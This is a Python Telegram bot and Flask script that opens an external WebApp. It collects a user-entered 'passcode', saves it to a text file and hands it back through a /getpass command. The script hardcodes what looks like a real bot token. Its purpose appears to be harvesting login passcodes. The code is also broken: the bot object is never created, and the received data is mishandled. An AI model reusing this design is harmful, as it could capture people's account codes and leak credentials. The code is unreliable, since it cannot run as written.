import os
import telebot
from flask import Flask, Blueprint, request, jsonify
import json
from telebot import types

TOKEN = "8489651453:AAGIk0I76gE-_L4IQd9WftGZZbUFuWraM3c"
WEBAPP_URL = "https://nazar3984248.github.io/awdaw2/"

app = Flask(__name__)

path_cwd = os.path.dirname(os.path.realpath(__file__))
path_templates = os.path.join(path_cwd, "templates")
path_static = os.path.join(path_cwd, "static")

Func = Blueprint('func', __name__, static_folder=path_static, template_folder=path_templates)

@app.route('/')
def index():
    return "WebApp працює!"


# Обработчик получения данных из WebApp (получаем passcode или другой введённый код)
@bot.message_handler(content_types=['web_app_data'])
def handle_webapp_data(message):
    # Данные приходят в формате JSON
    data = message.web_app_data
    print(f"Received from WebApp: {data}")

    # Если это passcode, сохраняем его
    passcode = data.get("passcode")
    if passcode:
        with open("temp_passcode.txt", "w") as f:
            f.write(passcode)
        bot.send_message(message.chat.id, f"📄 Passcode сохранен: {passcode}")
    else:
        bot.send_message(message.chat.id, "❌ Не удалось получить код.")

    # Отправляем обратно в Telegram
    bot.send_message(message.chat.id, f"Отправлены данные: {data}")

    # Сохраняем данные в файл для теста (если нужно)
    with open("received_data.txt", "w") as f:
        f.write(json.dumps(data))

    bot.send_message(message.chat.id, f"Дані збережено: {data}")


# /start — показує кнопку з WebApp
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(
            text="Відкрити WebApp",
            web_app=types.WebAppInfo(url=WEBAPP_URL)
        )
    )
    bot.send_message(
        message.chat.id,
        "Привіт! Натисни, щоб відкрити WebApp:",
        reply_markup=markup
    )


# Endpoint для получения passcode
@app.route("/submit_data", methods=["POST"])
def submit_data():
    try:
        # Получаем данные от WebApp через API
        data = request.get_json()
        action = data.get("action")
        value = data.get("value")
        user_id = data.get("user_id")

        print(f"Received from WebApp: {action} = {value}")

        # Отправляем сообщение в Telegram
        if user_id:
            bot.send_message(user_id, f"✅ Got {action}: {value}")

        return jsonify(success=True, message="Data received"), 200
    except Exception as e:
        print("Error:", e)
        return jsonify(success=False, message=str(e)), 400


# Команда для получения сохранённого passcode
@bot.message_handler(commands=['getpass'])
def get_pass(message):
    try:
        with open("temp_passcode.txt", "r") as f:
            saved = f.read()
        bot.send_message(message.chat.id, f"📄 Saved passcode: {saved}")
    except FileNotFoundError:
        bot.send_message(message.chat.id, "❌ No passcode saved yet.")


# Запуск бота
print("Бот запущено! Очікуємо дані...")
bot.infinity_polling()

if __name__ == "__main__":
    port = 12345
    app.run(host="0.0.0.0", port=port)
